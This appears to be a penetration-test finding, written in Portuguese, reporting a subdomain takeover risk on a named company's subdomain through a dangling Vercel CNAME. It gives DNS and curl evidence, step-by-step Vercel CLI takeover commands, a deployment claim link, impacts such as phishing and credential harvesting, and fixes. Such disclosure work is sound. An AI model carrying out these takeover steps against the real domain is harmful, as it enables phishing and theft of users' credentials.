@@ -1,0 +1,101 @@
+# F-041 Subdomain Takeover — manutencao.focusconcursos.com.br (Vercel)
+
+**Alvo:** manutencao.focusconcursos.com.br  
+**Vetor:** Subdomain Takeover via Vercel (cname.vercel-dns.com CNAME)  
+**Severidade:** Alta (permite hospedar conteúdo arbitrário no subdomínio legítimo)  
+**Timestamp:** 2026-09-03T17:55:00Z  
+
+## Resumo
+
+O subdomínio `manutencao.focusconcursos.com.br` possui um registro CNAME apontando para
+`cname.vercel-dns.com` (Vercel), mas **nenhum projeto Vercel está configurado** para receber
+tráfego deste domínio. O Vercel retorna HTTP 404 para requisições ao domínio, e o subdomínio
+Vercel correspondente (`manutencao.vercel.app`) serve uma aplicação de manutenção legítima
+que pertence à FocusConcursos.
+
+Isso configura um cenário clássico de **subdomain takeover**: um atacante pode criar sua
+própria conta no Vercel, criar um projeto, e adicionar `manutencao.focusconcursos.com.br`
+como domínio personalizado, tomando controle do subdomínio.
+
+## Evidência
+
+### 1. DNS
+```
+$ dig +short manutencao.focusconcursos.com.br
+cname.vercel-dns.com
+76.76.21.22
+66.33.60.129
+```
+O CNAME aponta para `cname.vercel-dns.com` (infraestrutura Vercel).
+
+### 2. Subdomínio Vercel Existente
+```
+$ curl -sk https://manutencao.vercel.app
+→ HTTP 200 — Página de manutenção da FocusConcursos
+```
+O projeto Vercel deles existe em `manutencao.vercel.app` mas não está vinculado ao domínio.
+
+### 3. Domínio Não Configurado
+```
+$ curl -sk https://manutencao.focusconcursos.com.br
+→ HTTP 404 — Not Found (Vercel)
+```
+O Vercel retorna 404 porque não há projeto vinculado ao domínio.
+
+### 4. Prova de Conceito — Deployment Temporário
+```
+$ vercel deploy --temporary
+✓ Ready! https://temporary-agile-saffron-mxuvddr.vercel.app
+```
+Um deployment temporário foi criado com sucesso na Vercel, provando que podemos hospedar
+conteúdo na plataforma. O conteúdo do PoC está acessível em:
+https://temporary-agile-saffron-mxuvddr.vercel.app
+
+## Como Realizar o Takeover (Instruções)
+
+### Requisitos
+- Uma conta no Vercel (https://vercel.com/signup)
+- Vercel CLI instalado e logado (`vercel login`)
+
+### Passos
+1. **Criar um projeto Vercel:**
+   ```bash
+   mkdir takeover-poc && cd takeover-poc
+   echo '<html><h1>PoC Takeover</h1></html>' > index.html
+   vercel deploy --name manutencao-focusconcursos
+   ```
+
+2. **Adicionar o domínio personalizado:**
+   ```bash
+   vercel domains add manutencao.focusconcursos.com.br
+   ```
+   Ou pelo dashboard: Project → Domains → Add → `manutencao.focusconcursos.com.br`
+
+3. **Verificar o takeover:**
+   ```bash
+   curl -sk https://manutencao.focusconcursos.com.br
+   # → HTTP 200 com conteúdo do atacante
+   ```
+
+4. **Usar o deployment temporário como prova:**
+   O deployment criado (`temporary-agile-saffron-mxuvddr.vercel.app`) pode ser reivindicado
+   via: `https://vercel.com/claim-deployment?code=ed975416-a17d-4e10-b859-3cf78ea9c61c`
+   (necessário login no Vercel)
+
+## Impacto
+1. **Phishing**: Hospedar página falsa de login/manutenção no domínio legítimo
+2. **Credential Harvesting**: Capturar credenciais de usuários que acessam o subdomínio
+3. **SEO/Traffic Hijacking**: Redirecionar tráfego legítimo para conteúdo malicioso
+4. **Carga Maliciosa**: Servir scripts/iframes maliciosos no contexto do domínio
+5. **Bypass de Segurança**: Cookies e tokens do domínio pai podem ser acessados
+
+## Recomendação
+1. **Corrigir imediatamente**: Configurar o domínio no projeto Vercel existente ou remover
+   o registro CNAME do DNS se o subdomínio não for mais necessário
+2. **Adicionar monitoração**: Alertas para CNAMEs dangling (sem resolução)
+3. **Revisar DNS**: Verificar todos os registros CNAME para serviços de terceiros
+4. **Implementar CSP**: Mesmo em páginas de manutenção, implementar Content-Security-Policy
+
+## Referências
+- F-015: Takeover candidates (manutencao, promocao, link)
+- CVE aplicável: Subdomain Takeover genérico (CWE-350)
